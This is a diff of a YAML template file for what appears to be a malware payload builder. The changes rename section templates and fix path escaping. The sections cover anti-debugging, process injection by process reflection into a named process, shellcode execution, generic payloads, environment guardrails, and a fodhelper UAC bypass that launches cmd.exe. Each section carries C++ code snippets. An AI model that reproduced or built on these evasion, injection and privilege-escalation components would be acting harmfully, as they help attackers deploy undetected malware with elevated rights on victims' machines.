@@ -73,7 +73,7 @@ templates:
 
 sections:
   - header: "Anti Debugging"
-    template: "anti_debugging"
+    template: "antidebugging"
     display: "Anti Debugging"
     allowMultiple: true
     items:
@@ -97,7 +97,7 @@ sections:
           return FALSE;
 
   - header: "Process Injection"
-    template: "process_injection"
+    template: "psinjection"
     display: "Process Injection"
     allowMultiple: false
     inputs:
@@ -116,7 +116,7 @@ sections:
           if (MpfProcessInjectionViaProcessReflection((PBYTE)code_blob,dwSize, GetProcessOrThreadId(L"$psname$", true))) return 1;
 
   - header: "Shellcode Execution"
-    template: "shellcode_execution"
+    template: "shellcodeexecution"
     display: "Shellcode Execution"
     allowMultiple: false
     items:
@@ -144,7 +144,7 @@ sections:
 
 
   - header: "Generic Payload"
-    template: "generic_shellcoes"
+    template: "genericshellcode"
     display: "Generic Payload"
     allowMultiple: false
     items:
@@ -191,7 +191,7 @@ sections:
           return Payload;
 
   - header: "Guardrails"
-    template: "Guardrails"
+    template: "guardrail"
     display: "Guardrails (env vars)"
     allowMultiple: false
     inputs:
@@ -215,7 +215,7 @@ sections:
           }
 
   - header: "UAC Bypass"
-    template: "uac_bypass"
+    template: "uacb"
     display: "UAC Bypass"
     allowMultiple: false
     items:
@@ -224,7 +224,7 @@ sections:
         default: true
         snippet: |
           PROCESS_INFORMATION pi{};
-          if (UacBypassFodHelperMethodA("C:\Windows\System32\cmd.exe", &pi))
+          if (UacBypassFodHelperMethodA("C:\\Windows\\System32\\cmd.exe", &pi))
           {
               CloseHandle(pi.hThread);
               CloseHandle(pi.hProcess);
